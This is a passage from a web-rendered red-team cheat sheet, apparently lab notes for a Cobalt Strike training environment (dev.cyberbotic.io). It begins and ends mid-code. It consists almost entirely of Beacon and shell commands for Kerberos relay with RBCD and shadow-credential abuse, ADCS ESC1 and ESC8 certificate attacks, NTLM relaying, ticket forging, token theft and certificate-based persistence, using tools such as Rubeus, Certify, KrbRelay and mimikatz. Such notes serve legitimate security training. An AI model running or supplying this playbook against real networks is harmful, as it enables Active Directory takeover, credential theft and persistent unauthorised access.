to the top of your malleable C2 profile.</span><br><span class="hljs-built_in">set</span> tasks_max_size <span class="hljs-string">&quot;2097152&quot;</span>;<br>  <br><span class="hljs-comment"># After updating the C2 Profile reload the teamserver service</span><br><span class="hljs-variable">$</span> sudo systemctl daemon<span class="hljs-literal">-reload</span><br><span class="hljs-variable">$</span> sudo systemctl status teamserver.service<br><span class="hljs-variable">$</span> sudo systemctl stop teamserver.service<br><span class="hljs-variable">$</span> sudo systemctl <span class="hljs-built_in">start</span> teamserver.service<br><span class="hljs-variable">$</span> sudo systemctl enable teamserver.service<br>  <br><span class="hljs-comment">#----------------------------------------------------------------------------------</span><br>  <br><span class="hljs-comment"># 2- Using Kerberos Relay Attack with RBCD Abuse</span><br><span class="hljs-comment"># For help Check Notes : https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</span><br>  <br><span class="hljs-comment"># 2.1 - To abuse RBCD we must have Local System access to a Domain Computer, Same as RBCD abuse we can just create a new Computer Object and use it</span><br><span class="hljs-comment"># Create a Computer object</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe <span class="hljs-literal">--computer</span> EvilComputer <span class="hljs-literal">--make</span> <span class="hljs-literal">--domain</span> dev.cyberbotic.io<br><span class="hljs-comment"># Get its SID</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> EvilComputer <span class="hljs-literal">-Properties</span> objectsid<br>  <br><span class="hljs-comment"># 2.2 - Using Checkport, find a suitable port for the OXID resolver to circumvent a check in the (RPCSS).</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe<br>  <br><span class="hljs-comment"># 2.3 - Run KrbRelay at that port (Using -rbcd argument)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe <span class="hljs-literal">-spn</span> ldap/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-clsid</span> <span class="hljs-number">90</span>f18417<span class="hljs-literal">-f0f1-484e-9d3c-59dceee5dbd8</span> <span class="hljs-literal">-rbcd</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-9101</span> <span class="hljs-literal">-port</span> <span class="hljs-number">10</span><br>  <br><span class="hljs-comment"># 2.4 - Now, If we query  WKSTN-2$, we&#x27;ll see that there&#x27;s now an entry in in its  *msDS-AllowedToActOnBehalfOfOtherIdentity*  attribute.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Identity</span> wkstn<span class="hljs-literal">-2</span> <span class="hljs-literal">-Properties</span> msDS<span class="hljs-literal">-AllowedToActOnBehalfOfOtherIdentity</span><br>  <br><span class="hljs-comment"># 2.5 - We have new added comp credentials So we can request a TGT and perform an S4U to obtain a usable service tickets (TGS) for WKSTN-2.</span><br><span class="hljs-comment"># Using Machine Password to get the hash</span><br><span class="hljs-built_in">PS</span>&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer<span class="hljs-variable">$</span> /domain:dev.cyberbotic.io<br><span class="hljs-comment"># Using hash to get the TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer<span class="hljs-variable">$</span> /aes256:<span class="hljs-number">1</span>DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap<br><span class="hljs-comment"># Use S4U technique to get TGS for target computer using our TGT</span><br><span class="hljs-comment"># we do not use the FQDN of the target machine in the msdsspn parameter, We used host/wkstn-2.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer<span class="hljs-variable">$</span> /impersonateuser:Administrator /msdsspn:host/wkstn<span class="hljs-literal">-2</span> /ticket:doIF8j[<span class="hljs-type">...snip...</span>]MuaW8= /ptt<br>  <br><span class="hljs-comment"># 2.6 - To perform the elevation, use this TGS to interact with the local Service Control Manager over Kerberos to create and start a service binary payload. </span><br><span class="hljs-comment"># Use BOF and Aggressor Script that registers a new  elevate command in Beacon.</span><br><span class="hljs-comment"># C:\Tools\SCMUACBypass and is based on James&#x27; SCMUACBypass [](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)gist.</span><br>beacon&gt; elevate svc<span class="hljs-literal">-exe-krb</span> tcp<span class="hljs-literal">-local</span><br>  <br><span class="hljs-comment">#----------------------------------------------------------------------------------</span><br>  <br><span class="hljs-comment"># 3- Using Kerberos Relay Attack with Shadow Credential Abuse</span><br><span class="hljs-comment"># The advantage of using shadow credentials over RBCD is that we don&#x27;t need to add a fake computer to the domain.</span><br>  <br><span class="hljs-comment"># 3.1 - Verify that WKSTN-2 (Target Machine) has nothing in its  msDS-KeyCredentialLink attribute.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn<span class="hljs-literal">-2</span><span class="hljs-variable">$</span><br>  <br><span class="hljs-comment"># 3.2 - Run KrbRelay as before (in Kerberos Relay with RBCD above), but this time   with the  -shadowcred parameter.</span><br><span class="hljs-comment"># if gets error like  (0x800706D3): The authentication service is unknown. then reboot the machine</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe <span class="hljs-literal">-spn</span> ldap/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-clsid</span> <span class="hljs-number">90</span>f18417<span class="hljs-literal">-f0f1-484e-9d3c-59dceee5dbd8</span> <span class="hljs-literal">-shadowcred</span> <span class="hljs-literal">-port</span> <span class="hljs-number">10</span><br>  <br><span class="hljs-comment"># 3.3 - Like Whisker does, KrbRelay provides Rubeus command that will request a TGT for WKSTN-2. However, it will return an RC4 ticket so if you want an AES instead, do.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /certificate:MIIJyA[<span class="hljs-type">...snip...</span>]QCAgfQ /password:<span class="hljs-string">&quot;06ce8e51-a71a-4e0c-b8a3-992851ede95f&quot;</span> /enctype:aes256 /nowrap<br>  <br><span class="hljs-comment"># 3.4 - The S4U2Self trick can then be used to obtain a HOST service ticket like we did with RBCD.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn<span class="hljs-literal">-2</span> /user:wkstn<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /ticket:doIGkD[<span class="hljs-type">...snip...</span>]<span class="hljs-number">5</span>pbw== /ptt<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="Active-Directory-证书服务"><a href="#Active-Directory-证书服务" class="headerlink" title="Active Directory 证书服务"></a>Active Directory 证书服务</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Finding Certificate Authorities</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe cas /domain:dev.cyberbotic.io<br><br><span class="hljs-comment"># Miconfigured Certificate template (By dafault /vulnerable parameter looks only for Domain Users group in Enrollment Rights)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject<br><br><span class="hljs-comment">#------------------------------------------------------------------------------------</span><br><span class="hljs-comment"># ESC1 ( ENROLLEE_SUPPLIES_SUBJECT ) - Misconfigured Certificate Templates</span><br><br><span class="hljs-comment"># 1. Find the misconfigured certificate,</span><br><span class="hljs-comment"># Look for Enrollment Rights,</span><br><span class="hljs-comment"># check if *ENROLLEE_SUPPLIES_SUBJECT* is enabled in property (msPKI-Certificate-Name-Flag)</span><br><span class="hljs-comment"># certificate usage (pkiextendedkeyusage) has *Client Authentication* set.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable<br>beacon&gt; getuid<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject<br><br><span class="hljs-comment"># 2. Request a Certificate for other domain user (Domain Admin)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\sub<span class="hljs-literal">-ca</span> /template:CustomUser /altname:nlamb /domain:dev.cyberbotic.io<br><span class="hljs-comment"># For OutBound Forests the Certify fails , So either use Certreq or modify the Certify Source code.</span><br>- Check this <span class="hljs-keyword">for</span> help : [<span class="hljs-type">https</span>://<span class="hljs-type">github.com</span>/<span class="hljs-type">GhostPack</span>/<span class="hljs-type">Certify</span>/<span class="hljs-type">issues</span>/<span class="hljs-number">13</span><span class="hljs-comment">#issuecomment-1716046133](https://github.com/GhostPack/Certify/issues/13#issuecomment-1716046133)</span><br><br><span class="hljs-comment"># 3. Copy the whole certificate (both the private key and certificate) and save it to .pem file. Then use openssl command to convert it to pfx format.</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">openssl</span> <span class="hljs-type">pkcs12</span> -<span class="hljs-type">in</span> <span class="hljs-type">cert.pem</span> -<span class="hljs-type">keyex</span> -<span class="hljs-type">CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="hljs-type">export</span> -<span class="hljs-type">out</span> <span class="hljs-type">cert.pfx</span><br><span class="hljs-comment"># Convert .pfx into a base64 encoded string so it can be used with Rubeus</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">cat</span> <span class="hljs-type">cert.pfx</span> | <span class="hljs-type">base64</span> -<span class="hljs-type">w</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 4. use asktgt to request a TGT for the user using the certificate</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">asktgt</span> /<span class="hljs-type">user</span>:<span class="hljs-type">nlamb</span> /<span class="hljs-type">password</span>:<span class="hljs-type">pass123</span> /<span class="hljs-type">nowrap</span> /<span class="hljs-type">certificate</span>:<span class="hljs-type">MIIM7w</span>[<span class="hljs-type">...</span>]<span class="hljs-type">ECAggA</span><br><br><span class="hljs-comment"># 5. Inject the TGT and look for Local Admin Access on other domain computers</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">createnetonly</span> /<span class="hljs-type">program</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">System32</span>\<span class="hljs-type">cmd.exe</span> /<span class="hljs-type">domain</span>:<span class="hljs-type">DEV</span> /<span class="hljs-type">username</span>:<span class="hljs-type">nlamb</span> /<span class="hljs-type">password</span>:<span class="hljs-type">FakePass</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFyD</span>[<span class="hljs-type">...</span>]<span class="hljs-type">MuaW8</span>=<br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">steal_token</span> <span class="hljs-number">2664</span><br><span class="hljs-comment"># Look for Local Admin Access on other domain computers.</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">powershell</span>-<span class="hljs-type">import</span> <span class="hljs-type">c</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">PowerSploit</span>\<span class="hljs-type">Recon</span>\<span class="hljs-type">PowerView.ps1</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">powerpick</span> <span class="hljs-built_in">Find-LocalAdminAccess</span> -<span class="hljs-type">Verbose</span><br><span class="hljs-comment"># Then check if you can access anything on that machine.</span><br><br><span class="hljs-comment">#----------------------------------------------------------------</span><br>**<span class="hljs-comment"># ESC8 - NTLM Relaying to ADCS HTTP Endpoints**</span><br><br><span class="hljs-comment">## Prerequisite</span><br><span class="hljs-comment"># If both DC and CA are setup on same machine then we wouldn’t be able to relay a DC to a CA. In that case we can use ESC8 to gain access to machine where unconstrained delegation is configured, So that we can abuse the unconstrained Delegation later on.</span><br><br><span class="hljs-comment"># Web End point for certificate services is at http[s]://&lt;hostname&gt;/certsrv.</span><br><span class="hljs-comment"># Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate</span><br><span class="hljs-comment"># But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate</span><br><span class="hljs-comment"># Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2</span><br><br><span class="hljs-comment"># 1. Setup socks proxy (beacon session)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">socks</span> <span class="hljs-number">1080</span> <span class="hljs-type">socks5</span> <span class="hljs-type">disableNoAuth</span> <span class="hljs-type">socks_user</span> <span class="hljs-type">socks_password</span> <span class="hljs-type">enableLogging</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">socks</span> <span class="hljs-number">8090</span> <span class="hljs-type">socks4</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">socks</span> <span class="hljs-type">stop</span><br><br><span class="hljs-comment"># 2. Setup Proxychains to use this proxy</span><br><span class="hljs-variable">$</span> <span class="hljs-type">sudo</span> <span class="hljs-type">nano</span> /<span class="hljs-type">etc</span>/<span class="hljs-type">proxychains.conf</span><br><span class="hljs-type">socks5</span> <span class="hljs-number">127.0</span><span class="hljs-type">.0.1</span> <span class="hljs-number">1080</span> <span class="hljs-type">socks_user</span> <span class="hljs-type">socks_password</span><br><br><span class="hljs-comment"># 3. Execute NTLMRelayx to target the certificate server endpoint</span><br><span class="hljs-comment"># Find the IP of the CA (DA and CA are both same in lab).</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">powerpick</span> <span class="hljs-built_in">Get-IPAddress</span> -<span class="hljs-type">Identity</span> <span class="hljs-type">dc</span>-<span class="hljs-number">2</span><br><span class="hljs-type">attacker</span>@<span class="hljs-type">ubuntu</span> ~&gt; <span class="hljs-type">sudo</span> <span class="hljs-type">proxychains</span> <span class="hljs-type">ntlmrelayx.py</span> -<span class="hljs-type">t</span> <span class="hljs-type">https</span>://&lt;<span class="hljs-type">CA</span>-<span class="hljs-type">ip</span>&gt;/<span class="hljs-type">certsrv</span>/<span class="hljs-type">certfnsh.asp</span> -<span class="hljs-type">smb2support</span> --<span class="hljs-type">adcs</span> --<span class="hljs-type">no</span>-<span class="hljs-type">http</span>-<span class="hljs-type">server</span><br><span class="hljs-type">attacker</span>@<span class="hljs-type">ubuntu</span> ~&gt; <span class="hljs-type">sudo</span> <span class="hljs-type">proxychains</span> <span class="hljs-type">ntlmrelayx.py</span> -<span class="hljs-type">t</span> <span class="hljs-type">https</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.122.10</span>/<span class="hljs-type">certsrv</span>/<span class="hljs-type">certfnsh.asp</span> -<span class="hljs-type">smb2support</span> --<span class="hljs-type">adcs</span> --<span class="hljs-type">no</span>-<span class="hljs-type">http</span>-<span class="hljs-type">server</span><br><br><span class="hljs-comment"># 4. Setup reverse port forwarding (System shell)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">rportfwd</span> <span class="hljs-number">8445</span> <span class="hljs-number">127.0</span><span class="hljs-type">.0.1</span> <span class="hljs-number">445</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">rportfwd</span> <span class="hljs-type">stop</span> <span class="hljs-number">8445</span><br><br><span class="hljs-comment"># 5. Upload PortBender driver and load its cna file (System shell)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">cd</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">system32</span>\<span class="hljs-type">drivers</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">upload</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">PortBender</span>\<span class="hljs-type">WinDivert64.sys</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">PortBender</span> <span class="hljs-type">redirect</span> <span class="hljs-number">445</span> <span class="hljs-number">8445</span><br><span class="hljs-comment"># To kill portbender , Kill the job</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">jobs</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">jobkill</span> &lt;<span class="hljs-type">JID</span>&gt;<br><br><span class="hljs-comment"># 6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">SharpSystemTriggers</span>\<span class="hljs-type">SharpSpoolTrigger</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">SharpSpoolTrigger.exe</span> &lt;<span class="hljs-type">Unconstrained</span>-<span class="hljs-type">Machine</span>-<span class="hljs-type">IP</span>&gt; &lt;<span class="hljs-type">Current</span>-<span class="hljs-type">Machine</span>-<span class="hljs-type">IP</span>&gt;<br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">SharpSystemTriggers</span>\<span class="hljs-type">SharpSpoolTrigger</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">SharpSpoolTrigger.exe</span> <span class="hljs-number">10.10</span><span class="hljs-type">.122.30</span> <span class="hljs-number">10.10</span><span class="hljs-type">.123.102</span><br><br><span class="hljs-comment"># 7. Use the Base64 encoded machine certificate obtained to get TGT of machine account</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">asktgt</span> /<span class="hljs-type">user</span>:<span class="hljs-type">WEB</span><span class="hljs-variable">$</span> /<span class="hljs-type">certificate</span>:<span class="hljs-type">MIIM7w</span>[<span class="hljs-type">...</span>]<span class="hljs-type">ECAggA</span> /<span class="hljs-type">nowrap</span><br><br><span class="hljs-comment"># 8. Use the TGT ticket obtained for S4U attack to get a service ticket TGS.</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">s4u</span> /<span class="hljs-type">impersonateuser</span>:<span class="hljs-type">Administrator</span> /<span class="hljs-type">self</span> /<span class="hljs-type">altservice</span>:<span class="hljs-type">cifs</span>/<span class="hljs-type">web.dev.cyberbotic.io</span> /<span class="hljs-type">nowrap</span> /<span class="hljs-type">user</span>:<span class="hljs-type">WEB</span><span class="hljs-variable">$</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFuj</span>[<span class="hljs-type">...</span>]<span class="hljs-type">lDLklP</span><br><br><span class="hljs-comment"># 9. Inject the Service Ticket by creating a new sacrificial token</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">createnetonly</span> /<span class="hljs-type">program</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">System32</span>\<span class="hljs-type">cmd.exe</span> /<span class="hljs-type">domain</span>:<span class="hljs-type">DEV</span> /<span class="hljs-type">username</span>:<span class="hljs-type">Administrator</span> /<span class="hljs-type">password</span>:<span class="hljs-type">FakePass</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFyD</span>[<span class="hljs-type">...</span>]<span class="hljs-type">MuaW8</span>=<span class="hljs-type">tok</span><br><br><span class="hljs-comment"># 10. Steal token and access the service</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">steal_token</span> <span class="hljs-number">1234</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">ls</span> \\<span class="hljs-type">web.dev.cyberbotic.io</span>\<span class="hljs-type">c</span><span class="hljs-variable">$</span><br><br><span class="hljs-comment"># 11. Revert all the changes made during attack</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">socks</span> <span class="hljs-type">stop</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">jobs</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">jobkill</span> &lt;<span class="hljs-type">portbender</span>-<span class="hljs-type">Job</span>-<span class="hljs-type">ID</span>&gt;<br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">rportfwd</span> <span class="hljs-type">stop</span> <span class="hljs-number">8445</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------</span><br><span class="hljs-comment">## PERSIST-1 &amp; PERSIST-2 : User &amp; Computer Persistance</span><br><br><span class="hljs-comment"># PERSIST-1 : User Persistance</span><br><br><span class="hljs-comment"># 1-a. Enumerate and export user certificate from their Personal Certificate store (execute from user session)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Seatbelt</span>\<span class="hljs-type">Seatbelt</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Seatbelt.exe</span> <span class="hljs-type">Certificates</span><br><span class="hljs-comment"># Export the certificate as DER and PFX file on disk</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">mimikatz</span> <span class="hljs-type">crypto</span>::<span class="hljs-type">certificates</span> /<span class="hljs-type">export</span><br><br><span class="hljs-comment"># 1-b. If the user does not have a certificate in their store, we can just request one with Certify. Make sure we are in Domain user&#x27;s sessions context of user for which we are requesting certificate.</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Certify</span>\<span class="hljs-type">Certify</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Certify.exe</span> <span class="hljs-type">request</span> /<span class="hljs-type">ca</span>:<span class="hljs-type">dc</span>-<span class="hljs-number">2</span><span class="hljs-type">.dev.cyberbotic.io</span>\<span class="hljs-type">sub</span>-<span class="hljs-type">ca</span> /<span class="hljs-type">template</span>:<span class="hljs-type">User</span><br><span class="hljs-comment"># Save the Private And Public key both in a file with .pem extension</span><br><span class="hljs-comment"># Then convert the .pem file to .pfx</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">openssl</span> <span class="hljs-type">pkcs12</span> -<span class="hljs-type">in</span> <span class="hljs-type">cert.pem</span> -<span class="hljs-type">keyex</span> -<span class="hljs-type">CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="hljs-type">export</span> -<span class="hljs-type">out</span> <span class="hljs-type">cert.pfx</span><br><br><span class="hljs-comment"># 2. Encode the PFX file to be used with Rubeus</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">cat</span> /<span class="hljs-type">mnt</span>/<span class="hljs-type">c</span>/<span class="hljs-type">Users</span>/<span class="hljs-type">Attacker</span>/<span class="hljs-type">Desktop</span>/<span class="hljs-type">CURRENT_USER_My_0_Nina</span>\ <span class="hljs-type">Lamb.pfx</span> | <span class="hljs-type">base64</span> -<span class="hljs-type">w</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 3. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span 